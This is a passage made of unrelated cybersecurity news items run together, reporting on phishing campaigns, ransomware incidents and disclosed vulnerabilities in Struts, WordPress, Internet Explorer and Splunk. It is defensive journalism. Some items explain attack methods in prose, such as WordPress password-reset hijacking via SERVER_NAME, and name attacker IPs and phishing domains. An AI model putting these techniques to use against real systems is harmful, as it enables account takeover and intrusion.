“They may appear suspicious because you don’t recognize the sender, weren’t expecting a document to sign, contain misspellings (like “docusgn.com” without an ‘i’ or @docus.com), contain an attachment, or direct you to a link that starts with anything other than https://www.docusign.com or https://www.docusign.net,” reads the advisory.
If you have reason to expect a DocuSign document via email, don’t respond to an email that looks like it’s from DocuSign by clicking a link in the message. When in doubt, access your documents directly by visiting docusign.com, and entering the unique security code included at the bottom of every legitimate DocuSign email. DocuSign says it will never ask recipients to open a PDF, Office document or ZIP file in an email.
DocuSign was already a perennial target for phishers and malware writers, but this incident is likely to intensify attacks against its users and customers. DocuSign says it has more than 100 million users, and it seems all but certain that the criminals who stole the company’s customer email list are going to be putting it to nefarious use for some time to come.

After the ransacking of MongoDB, ElasticSearch, Hadoop, CouchDB, and Cassandra servers, attackers are now hijacking hundreds of MySQL databases, deleting their content, and leaving a ransom note behind asking for a 0.2 Bitcoin ($235) payment.
According to breach detection firm GuardiCore, the attacks are happening via brute-force attacks on Internet-exposed MySQL servers, and there's plenty of those laying around since MySQL is one of today's most popular database systems.
All attacks came from a server in the Netherlands
Based on currently available evidence, the attacks started on February 12, and only lasted for 30 hours, during which time attackers attempted to brute-force their way into MySQL root accounts.
Investigators said all attacks came from the same IP address from the Netherlands, 109.236.88.20, belonging to a hosting company called WorldStream.
During their ransacking, attackers didn't behave in a constant pattern, making it hard to attribute the hacks to one group, despite the usage of the same IP.
For example, after gaining access to MySQL servers, attackers created a new database called PLEASE_READ and left a table inside it called WARNING that contained their ransom demands. In some cases, attackers only created the WARNING table and left it inside an already existing database, without creating a new one.
Investigators report that attackers would then dump the database's content and delete it afterward, leaving only the one holding their ransom. In some cases, attackers deleted the databases without dumping any data.
Attackers have their own website
Two ransom notes have been found in the hundreds of confirmed attacks, one asking victims to get in contact via email and confirm the payment, while the other used a completely different mode of operation, redirecting users to a Tor-hosted website.
The two Bitcoin addresses listed in the ransom notes received four and six payments, respectively, albeit GuardiCore experts doubt that all are from victims.
""We can not tell whether it was the attackers who made the transactions to make their victims feel more confident about paying,"" they said.
Be sure the attacker still has your data
Just like in the case of the now infamous MongoDB attacks that have hit over 41,000 servers, it's recommended that victims check logs before deciding to pay and see if the attackers actually took their data.
If companies elect to pay the ransom, should always ask the attacker for proof they still have their data.
None of this would be an issue if IT teams follow standard security practices that involve using an automated server backup system and deleting the MySQL root account or at least using a strong and hard-to-brute-force password.
This is not the first time MySQL servers have been held for ransom. The same thing happened in 2015, in a series of attacks called RansomWeb, where attackers used unpatched phpBB forums to hijack databases and hold websites up for ransom.

Cyber criminals took a second swing at Mecklenburg County government on Thursday after officials rejected a demand for money following a ransomware attack.
The follow-up attempts to hold the county hostage over illegally encrypted data came just hours after County Manager Dena Diorio announced she’d decided against paying a hacker ransom. Instead of agreeing to pay criminals, she said Wednesday, the county will rebuild its system applications and restore files and data from backups.
But by Thursday afternoon, hackers tried to strike again.
Diorio sent staff members an email saying, “I have a new warning for employees.”
As the county’s IT staff worked to recover from the first cyberattack, Diorio said, they discovered more attempts to compromise computers and data on Thursday.
“To limit the possibility of a new infection, ITS is disabling employees’ ability to open attachments generated by DropBox and Google Documents,” she wrote in an email. “The best advice for now is to limit your use of emails containing attachments, and try to conduct as much business as possible by phone or in person.”
She described the aftermath of the ransomware attack as a “crisis” and reassured employees they should not feel personally responsible for the incident.
The county first learned of the problem earlier this week after an employee opened a malicious “phishing” email and accessed an attached file that unleashed a widespread problem inside the county’s network of computers and information technology.
The intent of that ransomware attack was to essentially access as many county government files and data servers as possible. Then, the information was encrypted or locked, keeping employees at the county from accessing operating systems and files. The person or people responsible for the infiltration then demanded the county pay two bitcoins, or about $23,000, in exchange for a release of the locked data. The county refused to pay.
County officials say they anticipate the recovery time for Mecklenburg County government operations will take days.
“We are open for business, and we are slow, but there’s no indication of any data loss or that personal information was compromised,” Diorio said.
Diorio said third-party security experts believe the attack earlier this week by a new strain of ransomware called LockCrypt originated from Iran or Ukraine. Forty-eight of about 500 county computer servers were affected.

The largest NHS trust in England has been hit by a cyber-attack that could affect thousands of files across at least four London hospitals.
Barts health trust, which runs five hospitals in east London – the Royal London, St Bartholomew’s, Whipps Cross, Mile End and Newham – has sent a message to staff urging them not to open email attachments from unknown senders.
“We are urgently investigating this matter and have taken a number of drives offline as a precautionary measure, a Barts spokeswoman said.
“We have tried and tested contingency plans in place and are making every effort to ensure that patient care will not be affected”.
It was reported earlier on Friday that the trust had been targeted with ransomware, which is normally delivered via emails that trick the recipient into opening attachments and releasing malware on to their system.
But the spokeswoman ruled out such an attack on Friday night.
The trust has not said how much of its system has been affected by the attack or whether patient data has been compromised but it said it believed that most of the affected system was housing corporate data.
The trust’s filing system between departments has been turned off while the investigation takes place.
Staff at the Royal Free London foundation trust were also warned to beware of attacks on Friday, the Guardian has learned.
“We have been informed of a major cyber-attack on NHS organisations.
Please exercise extreme caution when opening any email attachments from unknown source or that don’t seem relevant to you.
We will be carrying out security scans on all computers within the trust so please leave them switched on until further notice,” wrote the trust’s IT director, Tosh Mondal.
A spokesman said the email was in reaction to the Barts attack and that the Royal Free London, as well as Barnet and Chase Farm hospitals, had not been affected.
NHS Digital said it was aware that Barts had been infected by a “virus which has affected their IT systems”.
A spokesperson said: “This issue highlights the fact that there are threats to data security within the health and care sector, as with any other sector.
We remain committed to supporting the protection of data with the highest possible security standards, high levels of security expertise from the centre and appropriate training and awareness of the risks for all staff”.
She declined to answer questions about whether other NHS trusts had been affected, how much data may have been affected and who may be behind the attack.
In October, the Northern Lincolnshire and Goole foundation trust was hit by an attack in which malware was used to encrypt files and demand a ransom in order to restore access.
The trust did not pay the ransom but was forced to cancel patient appointments as its systems were shut down to remove the virus.
John Bambenek, a threat intelligence manager at the firm Fidelis Cybersecurity, said: “The trouble is that local authorities and governments aren’t very prepared and they have extremely valuable information that simply can’t be lost, so they’re a tempting target for cybercriminals.
“Cyber defence is essential, but it’s no longer enough; organisations of all sizes need to invest in detecting threats as well.
Only then will cyber criminals be caught early enough to expel them from the network before serious damage is done”.

The Internal Revenue Service (IRS) has said that personal data of nearly 100,000 taxpayers may have been compromised by a breach of its tool to apply for student financial aid, The Chronicle of Higher Education reports.
The Free Application for Federal Student Aid (FAFSA) tool was taken offline in March after discovery of suspicious activity, and will be operational only in October.
In a statement to the Senate Finance Committee, IRS chief John Koskinen said 35,000 affected people had been notified of the breach and $30 million been paid for around 8,000 fraudulent tax refunds.
The IRS has come under fire for cutting off the tool and Senator Lamar Alexander of Tennessee, urged authorities to “continue to prioritize getting the helpful data-retrieval tool back online quickly with adequate protection for users’ data”.
The agency admits being made aware in September last year that FAFSA could be misused by hackers.
“To shut it down without a clear indication of criminals actually using it seemed to us that it was going to unnecessarily disadvantage millions of people who used it,” Koskinen clarified, says The Wall Street Journal.

It’s a new month which means another security patch from Google has been released and it’s currently rolling out to Pixel and select Nexus devices. The September 5, 2018 patch includes fixes for almost 60 vulnerabilities that were found in the AOSP repository. The update also includes in-car Bluetooth performance improvements for Pixel devices.
Google resolved 24 problems on September 1, 2018, and patched an additional 35 on September 5, 2018. Before the patch, a remote attacker could execute arbitrary code using a “specially crafted file … within the context of a privileged process.”
Fortunately, just like with most issues that’re fixed through security patches, Google states that it has not received a single report of an attacker using this vulnerability to harm a customer. 
In addition to the security fixes, Google has listed some of the improvements this update brings to its handsets:
    Improve battery charge in Retail Mode (Pixel 2, Pixel 2 XL)
    Improve SW Version reporting (Pixel, Pixel XL, Pixel 2, Pixel 2 XL)
    Improve audio quality over car speakers (Pixel, Pixel XL, Pixel 2, Pixel 2 XL)
If you don’t want to wait for the September security patch to make its way to your phone, you can download the latest factory image or OTA file from the links below. From there, you can either flash a fresh build to your phone or sideload the OTA update.
And in usual Essential fashion, the company has begun rolling out the September security patch to the Essential Phone within hours of it becoming available for Google’s hardware. On top of the fixed vulnerabilities, Essential states that the update includes various audio and accessibility fixes.

Consumers are being left vulnerable to increasingly sophisticated cybercriminals because major companies are not taking measures to protect them from plagues of fake emails, a leading cyber-crime expert has claimed.
Billions of “phishing” emails purporting to be from companies we trust such as Apple and Amazon, or banks, charities and even government departments, are reaching consumers’ inboxes.
Their intention is to trick recipients into visiting a website – specially created to mirror a legitimate business’s site – and entering personal details such as email addresses and passwords.
These can be used by criminals in a number of ways, including accessing bank accounts, making payments or applying for credit or other services.
Phishing emails are cleverly designed to mimic the firm’s real emails. They are increasingly well-written. Worryingly, as fraudsters invest more in their processes, the emails are also more likely to bypass spam filters.
To add to the convincing effect, criminals are buying domain names similar to the companies they are impersonating, so recipients are more likely to think the emails real.
Since January Action Fraud, the national cybercrime reporting service, has issued alerts about scams involving fake correspondence from HMRC, Amazon, and the Department of Education, among others.
But now the proliferation of these emails is causing some to question whether the real businesses are doing enough to protect their customers.
Chris Underhill, chief technical officer at Cyber Security Partners, a consultancy, said firms that communicate by email have a “corporate responsibility” to prevent fraudsters impersonating them online.
He said many firms were failing to take the basic – and inexpensive – precaution of buying up domain names similar to their own.
He said: “The technology is there for little cost but sadly the adoption rate is low.
“The responsibility is now placed on the consumer to check the sender of the emails is real.”
Telegraph Money found it was possible, for example, to buy domain names such as amazonuk.org, amazon.eu.co.uk or amazonuk.tech for as little as £5.99 per year.
Andrew Goodwill, of The Goodwill Group, a fraud-prevention consultancy, said consumers should “be incredibly sceptical” about any unsolicited digital communication even from familiar companies. If they contained links or asked for personal information they were “more than likely to be fake”, he said.
He added: “It’s a difficult situation. Why wouldn’t you expect to receive an email from a service you use?

We got several reports (thanks to Seren Thompson, Tahir Khan and Harry Vann) about OAUTH phishing attacks against Google users. The phishing attack arrives, of course, as an e-mail where it appears that a user (potentially even one on your contact list, so it looks very legitimate) has shared a document.

If you click on the link (Open in Docs), you will be redirected to the OAUTH2 service on accounts.google.com, it appears as Google Docs wants full access to my Gmail as well as my contacts. Of course, this is not real Google Docs – the attacker has simply named his “application” Google Docs – this can be verified by clicking on the Google Docs text where the real web site behind this and developer info is shown:

Obviously, once you allow access it is game over - the attacker probably uses the phishied Gmail account to further distribute phishing e-mails - we'll see if we can get more details.
So far at least the following domains are included:
googledocs.g-docs.win
googledocs.g-docs.pro
The domains are definitely malicious – the URL leads to jsserver.info where a fake alert that the computer is infected is shown.
UPDATE:
There are more domains - they all just change the TLD's for googledocs.g-docs.X or googledocs.docscloud.X. Most of them (if not all) appear to have been taken down (thanks @Jofo).
It also appears that Google has reacted quickly and are now recognizing e-mails containing malicious (phishing) URL's so the message ""Be careful with this message. Similar messages were used to steal people's personal information. Unless you trust the sender, don't click links or reply with personal information."" will be shown when such an e-mail is opened.

The attack was discovered when the perpetrators attempted a fraudulent wire transfer of money.
A link has been posted to your Facebook feed. 
A phishing email attack potentially compromised the accounts of as many as 18,000 current and former employees of media company Gannett Co.
As of Tuesday there was no indication of access to or acquisition of any sensitive personal data from employees’ accounts, said the company.
Gannett Co. (GCI) is the owner of USA TODAY, the publisher of this report, and 109 local news properties across the United States.
The attack was discovered on March 30 and investigated by Gannett’s cybersecurity team. It appeared to originate in emails to human resources staff.
The 18,000 current and former employees of the company will be sent notices about the incident and offer of credit monitoring via the US Postal Service. 
No customer account information was touched by the phishing attack.
They will be provided with an offer of credit monitoring because employee information was potentially available through some of the affected account login credentials before the accounts were locked down.
Phishing attacks are a common method used by attackers to infiltrate computer networks. They typically consist of faked emails sent to an employee that entice them to click on a link that unleashes malicious software that can compromise their computer accounts. Once in a network, attackers can then leapfrog to other accounts, working their way deeper into the system.
In the Gannett attack, the infiltration was discovered when the perpetrator attempted to use a co-opted account for a fraudulent corporate wire transfer request. The attempt was identified by Gannett's finance team as suspicious and was unsuccessful.

Investigators with Hold Security, a Wisconsin-based security consultancy, on Tuesday afternoon discovered an unsecure internal customer service portal for the company's Argentinian operations. The national ID numbers for at least 14,000 Argentinians have been exposed, but the leak could potentially affect tens of thousands more people.
The website held thousands of credit-related dispute records, faxes and national identity numbers for Argentinians who had filed complaints. It also stored the usernames and passwords in plaintext for about 100 of the company's customer service representatives.
The findings were first reported by cybersecurity blogger Brian Krebs, who notified Equifax. The website has now been shut down.
The findings will put further pressure on Equifax, which has been criticized for its haphazard and slow response to a breach that exposed the personal details of 143 million U.S. consumers, as well as an as-yet-unspecified number of British and Canadian residents.
Alex Holden, founder and CTO of Hold Security, tells Information Security Media Group that the Equifax website for Argentina ""could be exploited by a 3-year-old."" He says he didn't use any advanced hacking techniques to uncover the breach.
Holden - a veteran investigator credited with discovering the massive Adobe Systems and Target data breaches in 2013 - says he still found the Equifax findings ""completely unexpected and surprising.""
Equifax says it acted immediately to halt the leak, which is unrelated to the breach it announced Sept 7, says Meredith Griffanti, the company's spokeswoman for Latin America. The data was a ""limited amount of public information strictly related to consumers who contacted our customer service center and the employees who managed those interactions,"" she says.
""We have no evidence at this time that any consumers, customers, or information in our commercial and credit databases were negatively affected, and we will continue to test and improve all security measures in the region,"" Griffanti says.

Regulators and medical-device-makers are bracing for an expected barrage of hacking attacks even as legal and technical uncertainties leave them in uncharted territory.
Tens of millions of electronic health records have been compromised in recent years, a number that is growing and, some say, underreported.
High-profile attacks have hit hospitals and health insurers, and now attention is turning to a new vulnerability: medical devices like pacemakers and insulin pumps.
The Food and Drug Administration (FDA) has become increasingly concerned about the issue and is working to coordinate with other agencies on how to respond if a serious medical device hack were to occur.
There have been rumblings over cybersecurity for years.
More than 113 million personal health records were compromised in 2015, according to provider data reported to the Department of Health and Human Services (DHS), nine times as many as in 2014.
Last fall, Johnson & Johnson had to tell its customers that its insulin pumps had a security vulnerability that hackers could use to access the device and cause a potentially fatal overdose of insulin.
""In just the last few years, we've seen more than a hundred million health records of American citizens breached in a couple of well-publicized incidents,"" Terry Rice, vice president of IT risk management and chief information security officer at Merck & Company, told the Energy and Commerce Oversight and Investigations Subcommittee last week.

 Tumblr has fixed a vulnerability that it says could have exposed private user data, according to an announcement by the microblogging and social networking site.
The information that could have been viewed by unauthorized parties includes email addresses, hashed and salted passwords, locations, previously used email addresses, and last login IPs.
The flaw resided in the “Recommended Blogs” feature in the desktop version of Tumblr. The widget shows logged-in users a list of blogs that may be of interest to them.
“If a blog appeared in the module, it was possible, using debugging software in a certain way, to view certain account information associated with the blog,” said Tumblr.
Discovered and reported through the platform’s bug bounty program several weeks ago, the security vulnerability was resolved within 12 hours.
The New York-based company also said that it couldn’t determine which specific accounts were at risk, although its analysis is said to have shown that “the bug was rarely present”.
The site, which has over 440 million blogs, gave assurances to its users that it has found no evidence to suggest that any data was actually lifted.
At the same time, the platform said that users needn’t take any action. In these cases, “taking action” usually means “Change your passwords!”
Nevertheless, the company’s decision to disclose the flaw is because of what Tumblr says is its commitment to transparency and because it believes that “it’s simply the right thing to do”. It has also taken steps to “improve monitoring and analysis procedures to help it identify and fix any similar bugs in the future”.
Tumblr has joined the ranks of other high-profile technology companies, such as Twitter, Facebook and Google, that have all revealed vulnerabilities in recent weeks that could have been exploited, or were actually exploited, for harvesting the private information of some users.
Back in 2016, Tumblr had its hands full with a security incident that compromised the details of 65 million Tumblr users as a result of a breach dating back to 2013.

Apache Struts is an open-source web development framework for Java web applications.
On Monday, the Apache Struts developers fixed a high-impact vulnerability in the framework's Jakarta Multipart parser.
The vulnerability is very easy to exploit and allows attackers to execute system commands with the privileges of the user running the web server process.
What's even worse is that the Java web application doesn't even need to implement file upload functionality via the Jakarta Multipart parser in order to be vulnerable.
According to researchers from Qualys, the simple presence on the web server of this component, which is part of the Apache Struts framework by default, is enough to allow exploitation.
""Needless to say we think this is a high priority issue and the consequence of a successful attack is dire,"" said Amol Sarwate, director of Vulnerability Labs at Qualys, in a blog post.
Companies who use Apache Struts on their servers should upgrade the framework to versions 2.3.32 or 2.5.10.1 as soon as possible.
Researchers from Cisco Talos have observed ""a high number of exploitation events.""
Some of them only execute the Linux command whoami to determine the privileges of the web server user and are probably used for initial probing.
Others go further and stop the Linux firewall and then download an ELF executable that's executed on the server.
""The payloads have varied but include an IRC bouncer, a DoS bot, and a sample related to the bill gates botnet,"" the Talos researchers said in a blog post.
According to researchers from Spanish outfit Hack Players, Google searches indicate 35 million web applications that accept ""filetype:action"" uploads and a high percentage of them are likely vulnerable.
It's somewhat unusual that attacks have started so quickly after the flaw was announced and it's not yet clear whether an exploit for the vulnerability already existed in closed circles before Monday.
Users who can't immediately upgrade to the patched Struts versions can apply a workaround that consists of creating a Servlet filter for Content-Type that would discard any requests not matching multipart/form-data.
Web application firewall rules to block such requests are also available from various vendors.

Microsoft today released an emergency software patch to plug a critical security hole in its Internet Explorer (IE) Web browser that attackers are already using to break into Windows computers.
The software giant said it learned about the weakness (CVE-2018-8653) after receiving a report from Google about a new vulnerability being used in targeted attacks.
Satnam Narang, senior research engineer at Tenable, said the vulnerability affects the following installations of IE: Internet Explorer 11 from Windows 7 to Windows 10 as well as Windows Server 2012, 2016 and 2019; IE 9 on Windows Server 2008; and IE 10 on Windows Server 2012.
“As the flaw is being actively exploited in the wild, users are urged to update their systems as soon as possible to reduce the risk of compromise,” Narang said.
According to a somewhat sparse advisory about the patch, malware or attackers could use the flaw to break into Windows computers simply by getting a user to visit a hacked or booby-trapped Web site. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.
Microsoft says users who have Windows Update enabled and have applied the latest security updates are protected automatically. Windows 10 users can manually check for updates this way; instructions on how to do this for earlier versions of Windows are here.

The IT security researchers at Trend Micro recently discovered malware that has the potential to infect Linux-based servers. The malware, called Erebus, has been responsible for hijacking 153 Linux-based networks of a South Korean web-hosting company called NAYANA.
Erebus is a ransomware capable of infecting Linux operating systems. As such, around 3,400 of NAYANA’s clients were affected due to the attack with databases, websites and other files being encrypted.
The incident took place on 10th June. As of now, NAYANA has not received the keys to decrypt their files despite having paid three parts of the ransom. The fourth one, which is allegedly the last installment, is yet to be paid. However, according to NAYANA, the attackers claimed to provide the key after three payments.
According to Trend Micro’s report, Erebus was originally found back in September 2016. At the time, the malware was not that harmful and was being distributed through malware-containing advertisements. Once the user clicked on those ads, the ransomware would activate in the usual way.
The initial version of the Erebus only affected 423 file types and did so using the RSA-2048 encryption algorithm, thereby encrypting the files with the .encrypt extension. Furthermore, it was this variant that was using a number of websites in South Korea as a command-&-control (C&C) center.
Later, in February 2017, the malware had seemingly evolved as now it had the ability to bypass User Account Control (UAC). For those who may be unfamiliar with UAC, it is primarily a Windows privacy protection system that restricts anyone who is not authorized, to alter the user’s computer.
However, this later version of the Erebus was able to do so and inject ransomware ever so conveniently. The campaign in which this version was involved demanded a ransom of 0.085 bitcoins – equivalent to USD 216 at present – and threatened to delete the files in 96 hours if the ransom was not paid.
Now, however, Erebus has reached new heights by having the ability to bypass not only UAC but also affect entire networks that run on Linux. Given that most organizations today use Linux for their networks, it is no surprise to see that the effects of the malware are far-reaching.

According to Trend Micro, the most recent version of Erebus uses RSA algorithm to alter the AES keys in Windows and change the encryption key as such. Also, the attack is accompanied by a Bluetooth service so as to ensure that the ransomware does not break, even after the computer is rebooted.
This version can affect a total of 433 file types including databases, archives, office documents, email files, web-based files and multimedia files. The ransom demanded in this campaign amounts to 5 bitcoins, which is USD 12,344 currently.
Although ransomware affecting Linux based networks are rare, they are, however, not new. Erebus is not the first ransomware to have affected networks running on Linux. In fact, Trend Micro claims that such ransomware was discovered as far back as in 2014.
Some of the ransomware include Linux.Encoder, Encrypter RaaS, KillDisk, KimcilWare and much more. All of these were allegedly developed from an open-source code project that was available as part of an educational campaign.
The ransomware for Linux, despite being somewhat inferior to those for Windows, are still potent enough to cause damage on a massive scale. This is because, a number of organizations and data centers use Linux, and hijacking such high-end systems can only mean catastrophe.
To avoid any accidents happening, IT officials and organizations running Linux-based networks need to take some serious precautions. The most obvious one is to simply keep the server updated with the latest firmware and anti-virus software.
Furthermore, it is always a good idea to keep a back-up of your data files in two to three separate locations. It is also repeatedly advised to avoid installing unknown third-party programs as these can act as potential gateways for such ransomware.
Lastly, IT administrators should keep monitoring the traffic that passes through the network and looks for anomalies by identifying any inconsistencies in event logs.

The IRS, state tax agencies and the nation’s tax industry urge people to be on the lookout for new, sophisticated email phishing scams that could endanger their personal information and next year’s tax refund.
The most common way for cybercriminals to steal bank account information, passwords, credit cards or social security numbers is to simply ask for them. Every day, people fall victim to phishing scams that cost them their time and their money.
Those emails urgently warning users to update their online financial accounts—they’re fake. That email directing users to download a document from a cloud-storage provider? Fake. Those other emails suggesting the recipients have a $64 tax refund waiting at the IRS or that the IRS needs information about insurance policies—also fake. So are many new and evolving variations of these schemes.
The Internal Revenue Service, state tax agencies and the tax community are marking National Tax Security Awareness Week with a series of reminders to taxpayers and tax professionals.
Phishing attacks use email or malicious websites to solicit personal, tax or financial information by posing as a trustworthy organization. Often, recipients are fooled into believing the phishing communication is from someone they trust. A scam artist may take advantage of knowledge gained from online research and earlier attempts to masquerade as a legitimate source, including presenting the look and feel of authentic communications, such as using an official logo. These targeted messages can trick even the most cautious person into taking action that may compromise sensitive data.
The scams may contain emails with hyperlinks that take users to a fake site. Other versions contain PDF attachments that may download malware or viruses.
Some phishing emails will appear to come from a business colleague, friend or relative. These emails might be an email account compromise. Criminals may have compromised your friend’s email account and begin using their email contacts to send phishing emails.
Not all phishing attempts are emails, some are phone scams. One of the most common phone scams is the caller pretending to be from the IRS and threatening the taxpayer with a lawsuit or with arrest if payment is not made immediately, usually through a debit card.
Phishing attacks, especially online phishing scams, are popular with criminals because there is no fool-proof technology to defend against them. Users are the main defense. When users see a phishing scam, they should ensure they don’t take the bait.

The world governing body of track and field says it has become the victim of a cyberattack by a Russian hacking group linked to other incidents, including the hacking of the World Anti-Doping Agency and the U.S. Democratic Party.
In an April 3 statement, the International Association of Athletics Federations (IAAF) attributed the attack to the Fancy Bear group.
It said it believed the attack ""has compromised athletes' Therapeutic Use Exemption (TUE) applications stored on IAAF servers"" during an unauthorized remote access to its network on February 21.
Fancy Bear began posting medical records of Olympians online last year, with U.S. and British athletes making up a large proportion of those targeted.
Only selected records were released
The IAAF said it contacted Context Information Security, a British security company, in January to undertake a technical investigation of its systems.
The company says that investigation ""led to the discovery of a sophisticated intrusion.""
IAAF President Sebastian Coe said his organization will continue to do all it can to ""to remedy the situation and work with the world's best organizations to create as safe an environment as we can.""
Fancy Bear gained widespread notoriety last year when cyber-researchers identified it and another group -- and they appeared to be linked to Russian intelligence services.
They were also said to be behind the hack of the U.S. Democratic Party's computer systems.

Avid World of Warcraft players are being targeted with phishing emails seemingly coming from Blizzard Entertainment, the video game developer behind the popular multiplayer role-playing game, warns Malwarebytes’ Chris Boyd.
The email is supposedly a notification that a friend has purchased an in-game pet for the email recipient, and the latter can claim said pet by logging into Battle.net, Blizzards online gaming platform.
The (long) URL of the blocked phishing site mentions Battle.net, “password verify”, “login”, and “account support”, in the attempt to convince potential victims of the site’s legitimacy.
Still, it’s a piece of cake for the scammers to set up a new one and simply change the link in the phishing email, so the threat is still there, and gamers should be wary.

A phishing campaign is targeting customers of every major UK bank, with cybercriminals posing as customer support staff on Twitter in an attempt to steal users' online banking credentials.
Easy to carry out but difficult to defend against, phishing is an increasingly popular weapon of choice for hackers. That's because, with an authentic-looking fake website, they can just sit back and scoop up data as victims unwittingly hand over their usernames and passwords.
Phishing often relies on cybercriminals sending tailored emails to potential victims in an effort to lure them into giving up credentials or installing malware. However, cybersecurity researchers at Proofpoint have uncovered an Angler phishing campaign which, rather than being tailored to specific users, takes advantage of how they can often be careless on social media -- specifically Twitter.
In this instance, cybercriminals monitor Twitter for users approaching genuine support accounts for banks, and attempt to hijack the conversation with a fake support page.
This sort of phishing attack is unlikely to provide cybercriminals with the big score they'd hit if they targeted a corporate network, but it does enable the easy theft of credentials and small amounts of money -- and repeated success could become lucrative, and also provide criminals with access to other types of data which can be used to commit fraud.
""In many of the examples we've seen, the hacker is not just collecting banking credentials. They also look for information like ATM Pin, Credit/Debit card numbers, security questions and answers, and even social security numbers. With this information, they can circumvent some security measures, make purchases/withdrawals without online access, or create entirely new bogus accounts using the customer's information,"" says Celeste Kinswood at Proofpoint.
Fortunately, there are some simple things users can do to ensure they don't become victims of this style of social media phishing attack. For starters, a real support account will be verified with a blue tick and won't directly ask for login credentials. A quick search for the real account should also demonstrate if the one contacting you is fake.
Users may want to see their problems solved quickly, but taking ten seconds to verify who you're talking to will pay off in the long run.

Splunk has patched a slip in its JavaScript implementation that leaks user information.
The advisory at Full Disclosure explains that the leak happens if an attacker tricks an authenticated user into visiting a malicious Web page.
It only leaks the username, and whether or not that user has enabled remote access; but this would provide enough for an attacker to try follow-up phishing attacks to try and get the user's credentials.
The bug, the advisory says, is how Splunk used Object prototypes in JavaScript.
Here's the proof-of-concept JavaScript from the advisory:
The issue affects Splunk Enterprise versions 6.5.x before 6.5.3, 6.4.x before 6.4.6, 6.3.x before 6.3.10, 6.2.x before 6.2.13.1, 6.1.x before 6.1.13, 6.0.x before 6.0.14, 5.0.x before 5.0.18 and Splunk Light before 6.5.2, and the company has issued patches for all versions.

A zero-day vulnerability exists in WordPress Core that in some instances could allow an attacker to reset a user’s password and gain access to their account.
Researcher Dawid Golunski of Legal Hackers disclosed the vulnerability on Wednesday via his new ExploitBox service. All versions of WordPress, including the latest, 4.7.4, are vulnerable, the researcher said.
The vulnerability (CVE-2017-8295) happens because WordPress uses what Golunski calls untrusted data by default when it creates a password reset email.
In a proof-of-concept writeup, Golunski points out that WordPress uses a variable, SERVER_NAME, to get the hostname to create a From/Return-Path header for the password reset email. Since that variable, by its nature, can be customized, an attacker could insert a domain of his choosing and make it so an outgoing email could be sent to a malicious address, the researcher says. The attacker would then receive the reset email and be able to change the account password and take over.
“Depending on the configuration of the mail server, it may result in an email that gets sent to the victim WordPress user with such malicious From/Return-Path address set in the email headers,” Golunski wrote. “This could possibly allow the attacker to intercept the email containing the password reset link in some cases requiring user interaction as well as without user interaction.”
Golunski writes that there are three scenarios in which a user could be tricked, and only one of them relies on user interaction.
In one, an attacker could perform a denial of service attack on the victim’s email account in order to prevent the password reset email from reaching the victim’s account. Instead, it could bounce back to the malicious sender address, pointed at the attacker.
Second, Golunski says some auto-responders may attach a copy of the email sent in the body of the auto-replied message.
Third, by sending multiple password reset emails, he says the attacker could trigger the victim to ask for an explanation, below, which could contain the malicious password link.
Golunski said he reported the issue to WordPress’s security team multiple times, initially more than 10 months ago in July 2016. The researcher told Threatpost that WordPress never outright rejected his claim – he says WordPress told him it was working on the issue – but acknowledged that too much time has passed without a clear resolution, something which prompted him to release details on the bug on Wednesday.
Campbell said that it’s possible WordPress will patch the issue, even if just for poorly configured servers, but acknowledged he didn’t have a timetable for the fix. Concerned WordPress users should follow a public ticket that was started for the issue last July, Campbell added.
While there’s no official fix available yet, Golunski says users can enable the UseCanonicalName setting on Apache to enforce a static SERVER_NAME value to ensure it doesn’t get modified.
Golunski has had his hands full finding vulnerabilities related to PHP-based email platforms. He discovered a remote code execution bug in SquirrelMail in January that disclosed and quickly patched last month and similar RCE bugs in PHPMailer and SwiftMailer, libraries used to send emails via PHP, at the end of 2016.

Cyber attacks are becoming commonplace in 2017 and the most recent one might be a credit card breach which hit the popular retail chain Kmart, reported first on May 16, but only confirmed by parent company Sears Holding on Wednesday.
""Our Kmart store payment data systems were infected with a form of malicious code that was undetectable by current anti-virus systems and application controls. Once aware of the new malicious code, we quickly removed it and contained the event. We are confident that our customers can safely use their credit and debit cards in our retail stores,"" Howard Riefs, a spokesman for Sears Holding, said in a statement to Patch.
The company further explained the risk to its customers. “Based on the forensic investigation, NO PERSONAL identifying information (including names, addresses, social security numbers, and email addresses) was obtained by those criminally responsible. However, we believe certain credit card numbers have been compromised. Nevertheless, in light of our EMV compliant point of sale systems, which rolled out last year, we believe the exposure to cardholder data that can be used to create counterfeit cards is limited,"" it said.
The breach was first reported by security website Krebs on Security on May 16. Many small banks and credit unions received complaints about batches of stolen cards, all of which had been used at Kmart locations.
The company didn’t reveal which of its 735 locations were hit, but did say how the breach occurred. The company’s systems were hit with a malware designed to steal credit card data from point-of-sale devices installed at kiosks. The malware copies credit card information from the card’s magnetic strip, when the cards are swiped at payment kiosks. Using this information, the cards can be cloned and purchases made using these clones would be debited from the credit card user’s account.
This not the first time Kmart suffered such a breach. The retail chain had a similar breach in 2014 and had also claimed at the time the stolen data did not include customer names, emails addresses and personal information.
""We are actively enhancing our defenses in light of this new form of malware. Data security is of critical importance to our company, and we continuously review and improve the safeguards that protect our data in response to changing technology and new threats,"" it said.
It was however confirmed the breach did not target all Kmart locations, in which case credit card companies would have themselves issued warnings to customers against using their cards at retail stores.
Sears Holdings has set up a helpline for customers who might be affected by the breach. If you think you are one of them, you can call 888-488-5978 to get your queries answered.

LabCorp, one of the largest clinical labs in the U.S., said the Samsam ransomware attack that forced their systems offline was contained quickly and didn't result in a data breach.
However, in the brief time between detection and mitigation, the ransomware was able to encrypt thousands of systems and several hundred production servers.
The wider public first learned about the LabCorp incident on Monday, when the company disclosed it via an 8-K filing with the SEC. Since then, as recovery efforts continue, the company said they're at about 90-percent operational capacity.
According to sources familiar with the investigation, the Samsam attack at LabCorp started at midnight on July 13.
This is when the Samsam group used brute force against RDP and deployed ransomware by the same name to the LabCorp network. At 6:00 p.m. on Saturday, July 14, the first computer was encrypted.
The LabCorp SOC (Security Operation Center) immediately took action after that first system was encrypted, alerting IR teams and severing various links and connections.
These quick actions ultimately helped the company contain the spread of the infection and neutralize the attack within 50 minutes. However, before the attack was fully contained, 7,000 systems and 1,900 servers were impacted. Of those 1,900 servers, 350 were production servers. 
The analysis and recovery continued at that point. This led the company to confirm the source of the attack as a brute forced RDP instance, and confirm that only Windows systems were impacted.
According to NetFlow management and traffic monitoring, nothing left the network during the attack, so the company is confident that there was no data breach.
Given the RDP connection to this attack, and the fact that most attacks of this nature are bi-directional, LabCorp will likely implement two-factor authentication in the future.
